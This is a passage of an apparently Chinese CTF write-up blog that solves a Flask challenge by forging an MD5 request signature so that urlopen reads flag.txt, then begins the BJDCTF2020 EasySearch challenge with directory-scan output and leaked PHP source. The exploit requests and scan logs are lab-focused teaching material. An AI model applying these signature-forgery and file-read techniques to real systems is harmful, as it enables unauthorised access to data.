读取文件内容</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            <span class="comment"># 500报错，但是是修饰过的</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 强行给赋值500报错</span></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            <span class="comment"># msg状态赋值为 &quot;签名错误&quot;</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把装饰函数注册为路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    个人理解：从php角度</span></span><br><span class="line"><span class="string">    url解码，再传参</span></span><br><span class="line"><span class="string">    param = urldecode(get[&quot;param&quot;])</span></span><br><span class="line"><span class="string">    action = &quot;scan&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    最后调用下面的getSign(action, param)进行处理</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># URL解码函数 urllib.unquote</span></span><br><span class="line">    <span class="comment"># 解码URL字符串，解码的参数是param</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把装饰函数注册为路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    个人理解</span></span><br><span class="line"><span class="string">    action = cookie[action]</span></span><br><span class="line"><span class="string">    param = get[param]</span></span><br><span class="line"><span class="string">    sign = get[sign]</span></span><br><span class="line"><span class="string">    赋值完成后，防火墙筛查param</span></span><br><span class="line"><span class="string">    调用类进行处理</span></span><br><span class="line"><span class="string">    task = Task(action, param, sign, ip)</span></span><br><span class="line"><span class="string">    将python obj转json</span></span><br><span class="line"><span class="string">    json.dumps(task.Exec())</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 获取名为&quot;action&quot;的cookie值</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    <span class="comment"># 查询字典当中的&quot;param&quot;参数值</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment"># 获取名为&quot;sign&quot;的cookie值</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    <span class="comment"># 获取客户端IP地址</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用防火墙函数</span></span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 调用类处理</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="comment"># 将python对象转json字符串</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把装饰函数注册为路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    默认读取文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   	设置超时：1s</span></span><br><span class="line"><span class="string">   	</span></span><br><span class="line"><span class="string">   	打开param这个url，只读取前50个字符串，并且返回。</span></span><br><span class="line"><span class="string">   	否则显示超时</span></span><br><span class="line"><span class="string">   	&quot;&quot;&quot;</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将传入的参数和随机数密钥拼接在一起后，</span></span><br><span class="line"><span class="string">    进行md5加密+使用十六进制进行输出</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secret_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    加密功能和上面的一样</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    strip 分割字符串左右空白字符，</span></span><br><span class="line"><span class="string">    lower 将字符串转换为小写</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    check.startswith 是否以gopher开头或者file开头</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 过滤掉两个协议</span></span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 关闭调试模式</span></span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 绑定IP地址和端口</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这么来看的话，传参的函数处理有两个：</p>
<ol>
<li>一个是负责将输入的字符串md5编码后转换为十六进制字符串输出到前端</li>
<li>一个是传入网址，查看网址的协议是不是敏感协议gopher和file，不是则尝试调用类来处理。</li>
</ol>
<p>这里大概梳理下第二种方法的流程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 上面梳理了一点，这里稍微做点补充整合</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">cookie值控制action和sign</span></span><br><span class="line"><span class="string">get控制param</span></span><br><span class="line"><span class="string">IP地址不参加判断，先忽略。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输入3个参数，返回一个被json处理的类方法</span></span><br><span class="line"><span class="string">第四个参数IP，至始至终都没有参加过运算的条件判断，故忽略不计</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1.返回哈希值(URL请求1)</span></span><br><span class="line"><span class="string">	/geneSign?param=111</span></span><br><span class="line"><span class="string">	这里有一个很重要的点，就是传入的字符串加密后，在我们访问浏览器时获取的字符串是恒定的</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	恒定的 secret_key：</span></span><br><span class="line"><span class="string">	  假设你传入的就是111，那么加密后如下：</span></span><br><span class="line"><span class="string">	  03b7d9fad9ebeb01d93ddea09b10b4f3</span></span><br><span class="line"><span class="string">	  只要你靶场没挂，那么访问到的这个111加密的值就一定是固定的</span></span><br><span class="line"><span class="string">	  （可能这是flask的常识，但毕竟小白得认真点嘛……）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.返回flag的方法：(URL请求2)</span></span><br><span class="line"><span class="string">	这个传参调用hackbar插件就能实现了。</span></span><br><span class="line"><span class="string">	/De1ta?param=xxxxx</span></span><br><span class="line"><span class="string">	Cookie: action=?;sign=?</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>两种URL访问方式清晰了，那么传入的参数呢？</p>
<p>分析下我们要传入什么。我们要读取的是flag.txt,而读取的方式分为下面两种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写入文件的的if部分，条件是scan在action当中</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line"><span class="comment"># 读取文件的if部分，条件是read在action当中</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line"><span class="comment"># 因为是 &quot;in&quot; 而不是 &quot;=&quot;,并且是Python环境</span></span><br><span class="line"><span class="comment"># 所以说，最简单的办法，就是让</span></span><br><span class="line">action=<span class="string">&#x27;scanread&#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在确定了第一个参数action，接下来确认第二个参数param：</p>
<p>想要进入这两个if判断实现文件的读写，首先得满足最顶层的那个if判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if self.checkSign():的解读如下</span></span><br><span class="line">	self.checkSign()</span><br><span class="line">	等价于</span><br><span class="line">	getSign(self.action, self.param) == self.sign</span><br><span class="line">	等价于</span><br><span class="line">	hashlib.md5(secret_key + param + action).hexdigest() = sign</span><br><span class="line">	<span class="comment"># 这说明，我们要传入的是拼接好后与sign相等的值。</span></span><br><span class="line">	<span class="comment"># 这个需要调用前面的加密函数进行加密，也就是第一个传参</span></span><br><span class="line">	action的值基本确定了，param传参的值怎么确定？</span><br><span class="line">    <span class="comment"># 这个得往后看：scan判断后，函数执行如下：</span></span><br><span class="line">    scan(self.param)</span><br><span class="line">    等价于：</span><br><span class="line">    urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="comment"># 这个点是最让我不理解的地方。因为如果这点成立，那就是任意文件读取漏洞了</span></span><br><span class="line">    <span class="comment"># 这是最让我匪夷所思的点。不过经过测试，这种读取方式同样适用于当前目录下的code.txt</span></span><br><span class="line">    <span class="comment"># url的方式读取当前目录下的param,状态码显示正常</span></span><br><span class="line">    <span class="comment"># 有了这么个读取当前文件夹下文件的办法，根据提示词&quot;flag is in ./flag.txt&quot;</span></span><br><span class="line">    <span class="comment"># 就知道了可以读取当前目录下的flag文件。根据后面的反馈，确定了param是文件名：</span></span><br><span class="line">    resp = scan(self.param)</span><br><span class="line">    tmpfile.write(resp)</span><br><span class="line">    <span class="comment"># 确定下来为：</span></span><br><span class="line">    param=flag.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在，还差最后一个参数：sign</span></span><br><span class="line"><span class="comment"># 下面的(式子1)和(式子2)分别是URL请求2和URL请求1的两个相同式子的交叉理解</span></span><br><span class="line"><span class="comment"># 既然如此，根据这个式子：</span></span><br><span class="line">hashlib.md5(secret_key + param + action).hexdigest() = sign</span><br><span class="line">得到值变换为：(式子<span class="number">1</span>)</span><br><span class="line">hashlib.md5(secret_key + <span class="string">&#x27;flag.txt&#x27;</span> + <span class="string">&#x27;readscan&#x27;</span>).hexdigest() = sign</span><br><span class="line"><span class="comment"># 我们可以看到缺少的参数就剩下key，但key是固定的。</span></span><br><span class="line"><span class="comment"># 无法直接获取key，那么可以尝试调用现有的方法去生成带key的加密数据带入到式子进去。</span></span><br><span class="line"><span class="comment"># 调用加密哈希函数：</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="comment"># 这个是简写(式子2)</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(secret_key + param + action).hexdigest()</span><br><span class="line"><span class="comment"># 根据特征可以看出，内定的action值为&quot;scan&quot;,原本的拼接（上面那个）是这样子的：</span></span><br><span class="line"><span class="comment">#(式子1)</span></span><br><span class="line">hashlib.md5(secret_key + <span class="string">&#x27;flag.txt&#x27;</span> + <span class="string">&#x27;readscan&#x27;</span>).hexdigest()</span><br><span class="line"><span class="comment"># 在这里对action的值进行定义后，就变成了这个样子：</span></span><br><span class="line"><span class="comment">#(式子2)</span></span><br><span class="line">hashlib.md5(secret_key + <span class="string">&#x27;flag.txtread&#x27;</span> + <span class="string">&#x27;scan&#x27;</span>).hexdigest()</span><br><span class="line"><span class="comment"># 所以说，想要得到sign的值，想要进行一次</span></span><br><span class="line">/geneSign?param=flag.txtread</span><br><span class="line"><span class="comment"># 的申请，获得其哈希值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 哈希值的获取</span></span><br><span class="line">/geneSign?param=flag.txtread</span><br><span class="line"><span class="comment"># 返回：25852ee8f0abce94d5630069b01f65b6</span></span><br><span class="line"><span class="comment">#所以说sign的值为：</span></span><br><span class="line">sign=25852ee8f0abce94d5630069b01f65b6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 总结下，URL为：</span></span><br><span class="line">GET: /De1ta?param=flag.txt</span><br><span class="line">COOKIE: action=readscan;sign=25852ee8f0abce94d5630069b01f65b6</span><br></pre></td></tr></table></figure>

<p>这么一来，flag就回显出来了。</p>
<h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>鲜少遇到的flask源码审计，审计时还很难察觉到读取文件的函数是哪个的那种。不得不承认昨天虽然精神状态很糟糕，但还是把源码解析出来了。这里我意识到了一个一直以来被我忽略的东西：当前文件目录下的文件哪怕是Python，也能实现任意文件的读取，而且是在调用flask时，当作网络存储资源进使用。</p>
<p>这次不知道是不是大收获，知道了一些Python除开Open函数的读取函数。</p>
<p>这里的WAF把某些协议禁用了，让我往协议那方面靠，属于是掉坑里了……</p>
<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><h2 id="原始信息-25"><a href="#原始信息-25" class="headerlink" title="原始信息"></a>原始信息</h2><p>一个登录框,单从源码上看，没什么信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;public/css/base.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;public/css/login.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;form&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login_form&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;text_value&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;text_value&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tip&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;foot&quot;</span>&gt;</span></span><br><span class="line">    bjd.cn</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个页面能提供的信息太有限了，最多就剥离出一个表单提交用到的username和password。</p>
<p>尝试直接扫站：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫站的工具是dirmap,使用dirsearch也行，如果有字典，使用BP也能扫。</span></span><br><span class="line">[<span class="number">200</span>][text/html;charset=utf-<span class="number">8</span>][<span class="number">426.00</span>b] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/index.php</span></span><br><span class="line">[<span class="number">200</span>][text/html;charset=utf-<span class="number">8</span>][<span class="number">426.00</span>b] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/index.php</span></span><br><span class="line">[<span class="number">200</span>][text/css][<span class="number">535.00</span>b] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/public/css/login.css</span></span><br><span class="line">[<span class="number">200</span>][text/css][<span class="number">4.63</span>kb] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/public/css/base.css</span></span><br><span class="line">[<span class="number">200</span>][text/css][<span class="number">4.63</span>kb] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/public/css/base.css</span></span><br><span class="line">[<span class="number">200</span>][text/css][<span class="number">4.63</span>kb] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/public/css/base.css</span></span><br><span class="line">[<span class="number">200</span>][text/css][<span class="number">4.63</span>kb] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81/public/css/base.css</span></span><br><span class="line">[<span class="number">200</span>][text/plain; charset=utf-<span class="number">8</span>][<span class="number">1.13</span>kb] http:<span class="comment">//15d3e6ac-696a-4ea5-a7fb-68f75450b7df.node4.buuoj.cn:81//index.php.swp</span></span><br><span class="line"><span class="number">100</span>% (<span class="number">5878</span> of <span class="number">5878</span>) |<span class="comment">############################################################| Elapsed Time: 0:12:02 Time:  0:12:02</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就发现了一个很最重要的文件：index.php.swp</span></span><br></pre></td></tr></table></figure>

<p>打开index.php.swp得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)]; <span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码当中存在许多莫名其妙的***，可能是其他源码，这不是重点。</p>
<h2 id="解题-25"><a href="#解题-25" class="headerlink" title="解题"></a>解题</h2><p>html源码没什么可读性，主要关注php源码。</p>
<p>稍微整理下，进行源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 不可见的源码被我删掉了</span></span><br><span class="line"><span class="comment"># 启动输出缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># 定义ascii字符以及一些常见符号</span></span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">    <span class="comment"># mt_rand是获取随机整数的，这是从定义的字符串当中随机取出整数，并且拼接在一起</span></span><br><span class="line">    <span class="comment"># 随机从$chars当中取出字符串，一共5个</span></span><br><span class="line">    <span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">73</span>)] . <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">73</span>)] . <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">73</span>)] . <span class="variable">$chars</span>[<span class="title function_ 